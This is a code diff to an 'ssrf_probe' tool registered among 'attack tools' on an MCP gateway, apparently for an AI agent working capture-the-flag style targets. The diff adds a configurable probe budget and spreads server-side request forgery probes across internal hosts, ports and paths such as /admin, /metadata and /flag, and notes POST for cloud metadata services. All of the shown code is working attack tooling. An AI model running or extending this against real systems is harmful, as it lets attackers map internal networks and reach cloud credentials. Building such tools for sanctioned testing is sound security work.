@@ -658,6 +658,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         ports: str = "80,443,8080,5000,3000,8000,9200,5984,8500",
         paths: str = "/,/flag,/flag.txt,/admin,/api,/health,/status,/metadata",
         method: str = "GET",
+        max_probes: int = 30,
     ) -> ToolResult:
         """Discover internal services through an SSRF vector.
 
@@ -710,8 +711,37 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                             probe_url = f"{ssrf_url}?{url_param}={urllib.parse.quote(inner)}"
                     probes.append(probe_url)
 
-        # Limit total probes
-        probes = probes[:30]
+        # Keep an explicit safety budget, but choose representatives across
+        # hosts, ports and paths before filling the remaining slots.  A plain
+        # prefix would systematically miss later dimensions.
+        try:
+            budget = max(1, min(int(max_probes), 200))
+        except (TypeError, ValueError):
+            budget = 30
+        combinations = [(h, pt, p) for h in hosts[:8]
+                        for pt in port_list[:20] for p in path_list[:8]]
+        selected: list[tuple[str, str, str]] = []
+        for dimension in range(3):
+            for combo in combinations:
+                if combo in selected:
+                    continue
+                if dimension == 0 and combo[0] not in {c[0] for c in selected}:
+                    selected.append(combo)
+                elif dimension == 1 and combo[1] not in {c[1] for c in selected}:
+                    selected.append(combo)
+                elif dimension == 2 and combo[2] not in {c[2] for c in selected}:
+                    selected.append(combo)
+                if len(selected) >= budget:
+                    break
+            if len(selected) >= budget:
+                break
+        selected.extend(c for c in combinations if c not in selected)
+        selected = selected[:budget]
+        probes = []
+        for h, pt, p in selected:
+            inner = f"http://{h}:{pt}{p}"
+            sep = "&" if "?" in ssrf_url else "?"
+            probes.append(f"{ssrf_url}{sep}{url_param}={urllib.parse.quote(inner)}")
         try:
             for probe_url in probes:
                 try:
@@ -767,6 +797,8 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                 exit_code=0, elapsed_ms=elapsed,
                 parsed_output={
                     "probes_sent": len(probes),
+                    "probe_budget": budget,
+                    "budget_exhausted": len(probes) >= budget and len(combinations) > budget,
                     "responses": len(results),
                     "flags": [r.get("flag") for r in found_flags if r.get("flag")],
                     "reachable_services": [r.get("probe") for r in results],
@@ -777,7 +809,9 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             tool_name="ssrf_probe", success=False,
             stdout="", stderr="No internal services discovered through SSRF vector",
             exit_code=1, elapsed_ms=elapsed,
-            parsed_output={"probes_sent": len(probes), "responses": 0, "flags": []},
+            parsed_output={"probes_sent": len(probes), "probe_budget": budget,
+                           "budget_exhausted": len(probes) >= budget and len(combinations) > budget,
+                           "responses": 0, "flags": []},
         )
 
     gateway.register(
@@ -792,6 +826,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "ports": {"type": "string", "description": "Comma-separated ports to probe (default: 80,443,8080,5000,3000)"},
             "paths": {"type": "string", "description": "Comma-separated paths to probe (default: /,/flag,/flag.txt,/admin,/api)"},
             "method": {"type": "string", "description": "HTTP method: GET or POST. Use POST for services like IMDS that require it (default: GET)"},
+            "max_probes": {"type": "integer", "description": "Maximum SSRF requests (1-200, default 30); coverage is distributed across hosts, ports and paths."},
         },
     )
 
